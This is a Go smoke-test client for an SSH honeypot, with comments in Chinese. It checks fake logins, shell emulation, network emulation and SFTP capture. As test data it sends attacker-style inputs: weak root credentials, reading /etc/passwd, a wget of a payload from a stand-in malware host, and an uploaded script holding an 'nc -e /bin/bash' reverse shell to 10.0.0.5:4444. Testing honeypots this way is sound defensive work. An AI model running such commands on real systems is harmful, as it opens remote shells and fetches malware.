// smoketest 冒烟测试客户端：验证蜜罐认证欺骗（password/keyboard-interactive）、
// 命令执行（管道/通配符/命令替换/重定向）、VNet 网络仿真、SFTP 子系统、会话闭环。
// 用法: go run ./cmd/smoketest [-addr 127.0.0.1:23222]
package main

import (
	"flag"
	"fmt"
	"os"
	"strings"

	"github.com/pkg/sftp"
	"golang.org/x/crypto/ssh"
)

func main() {
	addr := flag.String("addr", "127.0.0.1:23222", "honeypot address")
	flag.Parse()
	fail := 0
	check := func(name string, err error, detail string) {
		if err != nil {
			fmt.Printf("[FAIL] %s: %v\n", name, err)
			fail++
			return
		}
		if detail != "" {
			fmt.Println(detail)
		}
		fmt.Printf("[OK] %s\n", name)
	}

	// 1) 弱口令登录 + 基础命令
	out, err := runSession(*addr, "root", "123456",
		"uname -a; id; ls -la /root; cat /etc/passwd; cd /tmp && pwd; whoami")
	check("weak-password login + basic commands", err, "===== output =====\n"+string(out)+"==================")

	// 2) 错误密码必须认证失败
	if _, err := runSession(*addr, "root", "wrongpass", "id"); err == nil {
		fmt.Println("[FAIL] wrong password should be rejected")
		fail++
	} else {
		fmt.Println("[OK] wrong password rejected")
	}

	// 3) 未知命令应返回 127 / command not found
	out, err = runSession(*addr, "root", "123456", "nosuchcmd")
	check("unknown command -> exit 127", err, string(out))

	// 4) keyboard-interactive 认证（弱口令放行）
	out, err = runKBI(*addr, "root", "123456", "whoami && pwd")
	check("keyboard-interactive auth", err, string(out))

	// 5) shell 语法：管道 + 通配符 + 命令替换 + 重定向
	out, err = runSession(*addr, "root", "123456",
		`echo "cmd-subst: $(whoami)"; cat /etc/passwd | grep -c root; ls /etc | head -3; echo hacked > /tmp/hacked.txt && cat /tmp/hacked.txt`)
	check("shell syntax (subst/pipe/glob/redirect)", err, string(out))

	// 6) VNet：wget 下载目标被记录
	out, err = runSession(*addr, "root", "123456", "wget http://malware.example.com/payload.sh")
	check("vnet wget emulation", err, string(out))

	// 7) SFTP 子系统：列目录 + 上传捕获
	check("sftp subsystem", testSFTP(*addr, "root", "123456"), "")

	if fail > 0 {
		fmt.Printf("[FAIL] %d check(s) failed\n", fail)
		os.Exit(1)
	}
	fmt.Println("[PASS] smoke test done")
}

func dial(addr, user, pass string) (*ssh.Client, error) {
	config := &ssh.ClientConfig{
		User:            user,
		Auth:            []ssh.AuthMethod{ssh.Password(pass)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         5 * 1e9,
	}
	return ssh.Dial("tcp", addr, config)
}

func runSession(addr, user, pass, command string) ([]byte, error) {
	client, err := dial(addr, user, pass)
	if err != nil {
		return nil, fmt.Errorf("dial+auth: %w", err)
	}
	defer client.Close()
	sess, err := client.NewSession()
	if err != nil {
		return nil, err
	}
	defer sess.Close()
	out, err := sess.CombinedOutput(command)
	if err != nil {
		ee, ok := err.(*ssh.ExitError)
		if !ok || ee.ExitStatus() != 127 {
			return out, err
		}
	}
	return out, nil
}

func runKBI(addr, user, pass, command string) ([]byte, error) {
	config := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{ssh.KeyboardInteractive(func(user, instruction string, questions []string, echos []bool) ([]string, error) {
			answers := make([]string, len(questions))
			for i := range questions {
				answers[i] = pass
			}
			return answers, nil
		})},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         5 * 1e9,
	}
	client, err := ssh.Dial("tcp", addr, config)
	if err != nil {
		return nil, fmt.Errorf("dial+auth(kbi): %w", err)
	}
	defer client.Close()
	sess, err := client.NewSession()
	if err != nil {
		return nil, err
	}
	defer sess.Close()
	return sess.CombinedOutput(command)
}

func testSFTP(addr, user, pass string) error {
	client, err := dial(addr, user, pass)
	if err != nil {
		return fmt.Errorf("dial: %w", err)
	}
	defer client.Close()
	sc, err := sftp.NewClient(client)
	if err != nil {
		return fmt.Errorf("sftp client: %w", err)
	}
	defer sc.Close()

	// 列目录
	entries, err := sc.ReadDir("/")
	if err != nil {
		return fmt.Errorf("readdir /: %w", err)
	}
	names := make([]string, 0, len(entries))
	for _, e := range entries {
		names = append(names, e.Name())
	}
	fmt.Println("  sftp ls /:", strings.Join(names, " "))

	// 上传（蜜罐应捕获为 file.written 事件）
	f, err := sc.Create("/tmp/evil.sh")
	if err != nil {
		return fmt.Errorf("create: %w", err)
	}
	content := "#!/bin/bash\nnc -e /bin/bash 10.0.0.5 4444 &\n"
	if _, err := f.Write([]byte(content)); err != nil {
		_ = f.Close()
		return fmt.Errorf("write: %w", err)
	}
	if err := f.Close(); err != nil {
		return fmt.Errorf("close: %w", err)
	}
	return nil
}
